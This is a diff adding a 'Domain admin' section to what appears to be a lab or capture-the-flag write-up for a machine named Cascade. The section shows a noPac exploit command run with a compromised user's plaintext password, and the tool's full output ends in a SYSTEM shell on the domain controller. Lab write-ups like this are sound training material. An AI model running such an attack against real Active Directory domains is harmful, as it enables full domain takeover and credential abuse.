@@ -177,4 +177,81 @@ SMB         10.129.18.9     445    CASC-DC1         [+] cascade.local\r.thompson
 ```
 This user is compromised
 
+# Domain admin
+```pythoi
+```
+
+```python
+python3 noPac.py cascade.local/r.thompson:'rY4n5eva' -dc-ip 10.129.18.9 -dc-host casc-dc1 -shell --impersonate administrator -use-ldap
+
+███    ██  ██████  ██████   █████   ██████ 
+████   ██ ██    ██ ██   ██ ██   ██ ██      
+██ ██  ██ ██    ██ ██████  ███████ ██      
+██  ██ ██ ██    ██ ██      ██   ██ ██      
+██   ████  ██████  ██      ██   ██  ██████ 
+    
+[*] Current ms-DS-MachineAccountQuota = 10
+[*] Selected Target CASC-DC1.cascade.local
+[*] will try to impersonate administrator
+[*] Adding Computer Account "WIN-RRNTVQP3YBF$"
+[*] MachineAccount "WIN-RRNTVQP3YBF$" password = rOa2XRkHugC#
+[*] Successfully added machine account WIN-RRNTVQP3YBF$ with password rOa2XRkHugC#.
+[*] WIN-RRNTVQP3YBF$ object = CN=WIN-RRNTVQP3YBF,CN=Computers,DC=cascade,DC=local
+[*] WIN-RRNTVQP3YBF$ sAMAccountName == CASC-DC1
+[*] Saving a DC's ticket in CASC-DC1.ccache
+[*] Reseting the machine account to WIN-RRNTVQP3YBF$
+[*] Restored WIN-RRNTVQP3YBF$ sAMAccountName to original value
+[*] Using TGT from cache
+[*] Impersonating administrator
+[*] 	Requesting S4U2self
+[*] Saving a user's ticket in administrator.ccache
+[*] Rename ccache to administrator_CASC-DC1.cascade.local.ccache
+[*] Attempting to del a computer with the name: WIN-RRNTVQP3YBF$
+[-] Delete computer WIN-RRNTVQP3YBF$ Failed! Maybe the current user does not have permission.
+[*] Pls make sure your choice hostname and the -dc-ip are same machine !!
+[*] Exploiting..
+[!] Launching semi-interactive shell - Careful what you execute
+C:\Windows\system32>whoami
+nt authority\system
+
+C:\Windows\system32>whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                  Description                               State   
+=============================== ========================================= ========
+SeAssignPrimaryTokenPrivilege   Replace a process level token             Disabled
+SeLockMemoryPrivilege           Lock pages in memory                      Enabled 
+SeIncreaseQuotaPrivilege        Adjust memory quotas for a process        Disabled
+SeTcbPrivilege                  Act as part of the operating system       Enabled 
+SeSecurityPrivilege             Manage auditing and security log          Disabled
+SeTakeOwnershipPrivilege        Take ownership of files or other objects  Disabled
+SeLoadDriverPrivilege           Load and unload device drivers            Disabled
+SeSystemProfilePrivilege        Profile system performance                Enabled 
+SeSystemtimePrivilege           Change the system time                    Disabled
+SeProfileSingleProcessPrivilege Profile single process                    Enabled 
+SeIncreaseBasePriorityPrivilege Increase scheduling priority              Enabled 
+SeCreatePagefilePrivilege       Create a pagefile                         Enabled 
+SeCreatePermanentPrivilege      Create permanent shared objects           Enabled 
+SeBackupPrivilege               Back up files and directories             Disabled
+SeRestorePrivilege              Restore files and directories             Disabled
+SeShutdownPrivilege             Shut down the system                      Disabled
+SeDebugPrivilege                Debug programs                            Enabled 
+SeAuditPrivilege                Generate security audits                  Enabled 
+SeSystemEnvironmentPrivilege    Modify firmware environment values        Disabled
+SeChangeNotifyPrivilege         Bypass traverse checking                  Enabled 
+SeUndockPrivilege               Remove computer from docking station      Disabled
+SeManageVolumePrivilege         Perform volume maintenance tasks          Disabled
+SeImpersonatePrivilege          Impersonate a client after authentication Enabled 
+SeCreateGlobalPrivilege         Create global objects                     Enabled 
+SeIncreaseWorkingSetPrivilege   Increase a process working set            Enabled 
+SeTimeZonePrivilege             Change the time zone                      Enabled 
+SeCreateSymbolicLinkPrivilege   Create symbolic links                     Enabled 
+
+C:\Windows\system32>
+```
+
+
+
 
